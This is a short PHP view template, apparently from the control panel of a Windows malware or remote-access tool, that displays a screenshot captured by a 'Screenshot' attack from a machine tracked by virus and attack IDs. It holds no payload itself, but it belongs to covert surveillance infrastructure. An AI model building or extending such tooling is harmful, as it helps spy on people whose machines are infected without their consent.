<?php

/** @var Screenshot $attack */

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\Screenshot\Screenshot;

$attack->usage()->addBandwidth(filesize($attack->getScreenPath()))->saveState();
$attack->reportDynamicUsage();

$stub = DOMAIN . "/vrs/" . $attack->getVirusId() . "/aks/" . $attack->getAttackId() . "/ctrls/getFile?file=screen.";
$mainSrc = $stub . Screenshot::$IMG_EXTENSION;
$backupSrc = $mainSrc . "png";

?>

<p>This attack is executed. Here is the screenshot:</p>
<div>
    <!--suppress HtmlDeprecatedAttribute -->
    <img src="<?php echo $mainSrc; ?>" width=100% alt="screenshot"
         onerror="this.onerror = null; this.src = '<?php echo $backupSrc; ?>'">
</div>
